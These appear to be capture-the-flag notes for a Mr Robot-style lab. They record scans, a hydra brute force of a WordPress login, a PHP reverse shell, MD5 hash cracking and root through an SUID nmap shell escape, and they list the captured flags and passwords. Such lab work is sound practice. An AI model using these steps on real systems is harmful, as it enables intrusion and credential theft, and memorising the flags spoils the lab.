ip#1: 10.10.233.89
ip#2: 10.10.86.2

export TARGET=10.10.86.2

nmap -Pn -sC -sV -oN nmap/initial $TARGET

nmap -Pn --script http-wordpress* -oN nmap/vulns $TARGET

nikto -h $TARGET




https://10.10.233.89/robots.txt

User-agent: *l
fsocity.dic
key-1-of-3.txt

https://10.10.233.89/key-1-of-3.txt => 073403c8a58a1f80d943455fb30724b9


wget https://10.10.233.89/fsociety.dic
cat fsocity.dic | sort -u |uniq > clean.dic


hydra -V -L fsocity.dic -p 123 $TARGET http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

[80][http-post-form] host: $TARGET   login: Elliot 


wpscan --url $TARGET --passwords fsocity.dic --usernames 'Elliot'

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

nc -lvp 9001

wget http://10.10.86.2/notfound.html

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/



daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b


GPU => hashcat -m 0 robot.hash /usr/share/wordlists/rockyou.txt
VM => https://crackstation.net/

robot:abcdefghijklmnopqrstuvwxyz


ey-2-of-3.txt
822c73956184f694993bede3eb39f959



```sh
obot@linux:/$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```


```sh
robot@linux:/$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4




http://10.10.233.89/fsociety

## Wordpress

Wordpress v4.3.1

CVE-2019-9787

http://10.10.233.89/wp-login.php


http-wordpress-users.nse
http-wordpress-enum.nse
http-wordpress-brute.nse
http-vuln-cve2017-1001000.nse
http-vuln-cve2014-8877.nse


--script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' <target>


## MSF 

exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
=> require auth

exploit/multi/http/wp_db_backup_rce                            2019-04-24       excellent  Yes    WP Database Backup RCE
=> require auth

exploit/unix/webapp/jquery_file_upload                         2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
